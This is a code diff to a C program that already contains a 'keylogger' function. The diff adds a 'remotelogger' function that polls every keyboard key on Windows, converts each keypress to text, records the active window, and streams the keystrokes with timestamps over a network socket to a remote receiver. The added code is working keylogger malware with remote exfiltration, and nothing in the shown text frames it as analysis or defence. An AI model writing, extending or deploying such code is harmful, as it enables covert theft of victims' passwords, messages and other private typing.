@@ -93,6 +93,52 @@ void quitHandler(int sig){
         sprintf(string,"\r\nUNRECOGNIZED: %d", keycode); return;
     }
 
+    void remotelogger(int s) {
+        signal(SIGINT, quitHandler);
+        signal(SIGTERM, quitHandler);
+
+        time_t t = time(NULL);
+        struct tm tm = *localtime(&t);
+
+        sprintf(string,
+                "\nLOGGING SESSION START: %d-%02d-%02d %02d:%02d:%02d "
+                "\nPLATFORM: WINDOWS\nCODEC: unicode",
+                tm.tm_year + 1900,
+                tm.tm_mon + 1,
+                tm.tm_mday,
+                tm.tm_hour,
+                tm.tm_min,
+                tm.tm_sec);
+
+        send(s , string , strlen(string) , 0);
+
+        while(running) {
+            for (int i = 0; i < 256; i++) {
+                char key = GetAsyncKeyState(i);
+                if (key > 0) {
+                    convert(i);
+                    send(s , string , strlen(string) , 0);
+                    break;
+                }
+            }
+            searchActiveWindow();
+            Sleep(10); /* previene la saturazione della CPU */
+        }
+
+        t = time(NULL);
+        tm = *localtime(&t);
+
+        sprintf(string, "\nLOGGING SESSION END: %d-%02d-%02d %02d:%02d:%02d",
+                tm.tm_year + 1900,
+                tm.tm_mon + 1,
+                tm.tm_mday,
+                tm.tm_hour,
+                tm.tm_min,
+                tm.tm_sec);
+
+        send(s , string , strlen(string) , 0);
+    }
+
     void keylogger(int keyboard, FILE* writeout) {
         signal(SIGINT, quitHandler);
         signal(SIGTERM, quitHandler);
